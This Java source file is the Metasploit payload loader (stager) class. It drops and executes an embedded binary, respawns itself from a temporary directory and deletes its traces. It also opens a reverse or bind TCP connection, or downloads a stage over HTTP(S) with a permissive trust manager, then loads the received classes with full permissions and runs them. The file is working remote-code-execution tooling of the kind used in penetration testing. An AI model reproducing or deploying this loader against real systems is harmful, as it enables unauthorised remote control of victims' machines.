/*
 * Java Payloads loader class for Metasploit.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package metasploit;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Locale;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;

/**
 * The main payload loader class. 
 * 
 * To invoke all the magic, call the {@link #main(String[])} method
 * (Or use it as Main-Class in a standalone jar and double-click it).
 */
public class Payload extends ClassLoader {

	public static void main(String[] ignored) throws Exception {
		// Find our properties. If we are running inside the jar, they are in a resource stream called "/metasploit.dat".
		Properties props = new Properties();
		Class clazz = Payload.class;
		String clazzFile = clazz.getName().replace('.', '/')+".class";
		InputStream propsStream = clazz.getResourceAsStream("/metasploit.dat");
		if (propsStream != null) {
			props.load(propsStream);
			propsStream.close();
		}
		
		// check if we should drop an executable
		String executableName = props.getProperty("Executable");
		if (executableName != null) {
			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
			tempDir.mkdir();
			File executableFile = new File(tempDir, executableName);
			writeEmbeddedFile(clazz, executableName, executableFile);
			props.remove("Executable");
			props.put("DroppedExecutable", executableFile.getCanonicalPath());
		}
		
		// check if we should respawn
		int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
		String droppedExecutable = props.getProperty("DroppedExecutable");
		if (spawn > 0) {
			// decrease count so that eventually the process
			// will stop spawning
			props.setProperty("Spawn", String.valueOf(spawn - 1));
			// write our class
			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
			File propFile = new File(tempDir, "metasploit.dat");
			File classFile = new File(tempDir, clazzFile);
			classFile.getParentFile().mkdirs();
			// load ourselves via the class loader (works both on disk and from Jar)
			writeEmbeddedFile(clazz, clazzFile, classFile);
			if(props.getProperty("URL", "").startsWith("https:")) {
				writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
			}
			if (props.getProperty("AESPassword", null) != null) {
				writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
			}
			FileOutputStream fos = new FileOutputStream(propFile);
			props.store(fos, "");
			fos.close();
			Process proc = Runtime.getRuntime().exec(new String[] {
					getJreExecutable("java"),
					"-classpath",
					tempDir.getAbsolutePath(),
					clazz.getName()
			});
			// the input streams might cause the child process to block if 
			// we do not read or close them
			proc.getInputStream().close();
			proc.getErrorStream().close();
			
			// give the process plenty of time to load the class if needed
			Thread.sleep(2000);
			
			// clean up (we can even delete the .class file on Windows
			// if the process is still running). Note that delete()
			// will only delete empty directories, so we have to delete
			// everything else first
			File[] files = new File[] {
					classFile, classFile.getParentFile(), propFile, tempDir
			};
			for (int i = 0; i < files.length; i++) {
				for (int j = 0; j < 10; j++) {
					if (files[i].delete())
						break;
					files[i].deleteOnExit();
					Thread.sleep(100);
				}
			}
		} else if (droppedExecutable != null) {
			File droppedFile = new File(droppedExecutable);
			// File.setExecutable is Java 1.6+, therefore call it via reflection and try
			// the chmod alternative if it fails. Do not call it at all for Windows.
			if (!IS_DOS) {
				try {
					try {
						File.class.getMethod("setExecutable", new Class[] {boolean.class}).invoke(droppedFile, new Object[] { Boolean.TRUE});
					} catch (NoSuchMethodException ex) {
						// ok, no setExecutable method, call chmod and wait for it	
						Runtime.getRuntime().exec(new String[] {"chmod", "+x", droppedExecutable}).waitFor();
					}
				} catch (Exception ex) {
					// try to continue anyway, we have nothing to lose
					ex.printStackTrace();
				}
			}
			
			// now execute the executable.
			// tempdir may contain spaces, so do not use the String variant of exec!
			Runtime.getRuntime().exec(new String[] {droppedExecutable});
			
			// Linux and other Unices allow removing files while they are in use
			if (!IS_DOS) {
				droppedFile.delete();
				droppedFile.getParentFile().delete();
			}
		} else {
			// check what stager to use (bind/reverse)
			int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
			String lHost = props.getProperty("LHOST", null);
			String url = props.getProperty("URL", null);
			InputStream in;
			OutputStream out;
			if (lPort <= 0) { 
				// debug code: just connect to stdin/stdout
				// best used with embedded stages
				in = System.in;
				out = System.out;			
			} else if (url != null) {
				if (url.startsWith("raw:"))
					// for debugging: just use raw bytes from property file
					in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
				else if (url.startsWith("https:")) {
					URLConnection uc = new URL(url).openConnection();
					// load the trust manager via reflection, to avoid loading
					// it when it is not needed (it requires Sun Java 1.4+)
					Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {uc});
					in = uc.getInputStream();
				} else
					in = new URL(url).openStream();
				out = new ByteArrayOutputStream();
			} else {
				Socket socket;
				if (lHost != null) {
					// reverse_tcp
					socket = new Socket(lHost, lPort);
				} else {
					// bind_tcp
					ServerSocket serverSocket = new ServerSocket(lPort);
					socket = serverSocket.accept();
					serverSocket.close(); // no need to listen any longer
				}
				in = socket.getInputStream();
				out = socket.getOutputStream();
			}
			
			String aesPassword = props.getProperty("AESPassword", null);
			if (aesPassword != null) {
				// load the crypto code via reflection, to avoid loading
				// it when it is not needed (it requires Sun Java 1.4+ or JCE)
				Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", new Class[] {InputStream.class, OutputStream.class, String.class}).invoke(null, new Object[] {in, out, aesPassword});
				in = (InputStream) streams[0];
				out = (OutputStream) streams[1];
			}
			
			// build the stage parameters, if any
			StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- "+props.getProperty("StageParameters", ""), " ");
			String[] stageParams = new String[stageParamTokenizer.countTokens()];
			for (int i = 0; i < stageParams.length; i++) {
				stageParams[i] = stageParamTokenizer.nextToken();
			}
			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
		}
	}

	private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
		InputStream in = clazz.getResourceAsStream("/"+resourceName);
		FileOutputStream fos = new FileOutputStream(targetFile);
		byte[] buf = new byte[4096];
		int len;
		while ((len = in.read(buf)) != -1) {
			fos.write(buf,0,len);
		}
		fos.close();
	}
	
	private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
		try {
			final DataInputStream in = new DataInputStream(rawIn);
			Class clazz;
			final Permissions permissions = new Permissions();
			permissions.add(new AllPermission());
			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            if (embeddedStageName == null) {
                int length = in.readInt();
                do {
                    final byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
                    length = in.readInt();
                } while (length > 0);
            } else {
                clazz = Class.forName("javapayload.stage."+embeddedStageName);
            }
			final Object stage = clazz.newInstance();
			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, stageParameters });
		} catch (final Throwable t) {
			t.printStackTrace(new PrintStream(out));
		}
	}	
	
	///
	/// The rest of the file is based on code from Apache Ant 1.8.1
	///
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");
    
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    private static final String JAVA_HOME = System.getProperty("java.home");

    private static String getJreExecutable(String command) {
        File jExecutable = null;

        if (IS_AIX) {
            // On IBM's JDK 1.2 the directory layout is different, 1.3 follows
            // Sun's layout.
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }

        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }

        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        } else {
            // Unfortunately on Windows java.home doesn't always refer
            // to the correct location, so we need to fall back to
            // assuming java is somewhere on the PATH.
            return addExtension(command);
        }
    }

    private static String addExtension(String command) {
        // This is the most common extension case - exe for windows and OS/2,
        // nothing for *nix.
        return command + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        File executable = null;
        if (dir.exists()) {
            executable = new File(dir, addExtension(commandName));
            if (!executable.exists()) {
                executable = null;
            }
        }
        return executable;
    }

    private static File normalize(final String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);

        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (".".equals(thisToken)) {
                continue;
            }
            if ("..".equals(thisToken)) {
                if (s.size() < 2) {
                    // Cannot resolve it, so skip it.
                    return new File(path);
                }
                s.pop();
            } else { // plain component
                s.push(thisToken);
            }
        }
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); i++) {
            if (i > 1) {
                // not before the filesystem root and not after it, since root
                // already contains one
                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }
    
    private static String[] dissect(String path) {
        char sep = File.separatorChar;
        path = path.replace('/', sep).replace('\\', sep);
        // make sure we are dealing with an absolute path
        String root = null;
        int colon = path.indexOf(':');
        if (colon > 0 && IS_DOS) {

            int next = colon + 1;
            root = path.substring(0, next);
            char[] ca = path.toCharArray();
            root += sep;
            //remove the initial separator; the root has it.
            next = (ca[next] == sep) ? next + 1 : next;

            StringBuffer sbPath = new StringBuffer();
            // Eliminate consecutive slashes after the drive spec:
            for (int i = next; i < ca.length; i++) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path = sbPath.toString();
        } else if (path.length() > 1 && path.charAt(1) == sep) {
            // UNC drive
            int nextsep = path.indexOf(sep, 2);
            nextsep = path.indexOf(sep, nextsep + 1);
            root = (nextsep > 2) ? path.substring(0, nextsep + 1) : path;
            path = path.substring(root.length());
        } else {
            root = File.separator;
            path = path.substring(1);
        }
        return new String[] {root, path};
    }
}
